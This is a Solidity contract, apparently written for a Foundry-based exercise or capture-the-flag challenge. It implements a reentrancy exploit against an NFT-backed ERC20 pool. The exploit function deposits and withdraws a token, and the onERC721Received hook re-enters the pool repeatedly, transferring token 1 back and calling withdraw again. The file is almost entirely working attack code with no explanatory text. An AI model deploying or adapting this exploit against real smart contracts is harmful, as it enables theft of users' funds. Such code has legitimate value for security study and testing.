// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import {Ownable} from "openzeppelin-contracts-07/contracts/access/Ownable.sol";
import {IERC20} from "openzeppelin-contracts-07/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-07/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "openzeppelin-contracts-07/contracts/token/ERC721/IERC721Receiver.sol";
import "forge-std/console.sol";

interface IPool is IERC20 {
    function deposit(uint256 tokenId) external;
    function withdraw(uint256 tokenId) external;
}

contract PoolExploit is Ownable, IERC721Receiver {
    address private immutable pool;
    address private immutable nft;
    uint256 private cnt;

    constructor(address _pool, address _nft) {
        pool = _pool;
        nft = _nft;
    }

    function exploit(uint256 tokenId) external onlyOwner {
        IERC721(nft).approve(pool, tokenId);
        IPool(pool).deposit(tokenId);
        IPool(pool).withdraw(tokenId);
    }

    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
        if (cnt <= 2) {
            cnt++;
            IERC721(nft).safeTransferFrom(address(this), pool, 1);
            IPool(pool).withdraw(1);
        }
        return PoolExploit.onERC721Received.selector;
    }
}
